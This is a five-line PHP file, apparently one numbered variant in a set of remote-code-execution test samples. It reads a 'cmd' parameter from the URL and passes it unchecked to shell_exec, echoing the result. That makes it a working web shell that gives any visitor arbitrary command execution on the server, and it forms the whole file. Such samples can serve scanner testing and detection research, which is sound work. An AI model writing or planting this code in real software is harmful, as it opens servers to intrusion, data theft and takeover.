<?php
// RCE test variation #1126
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>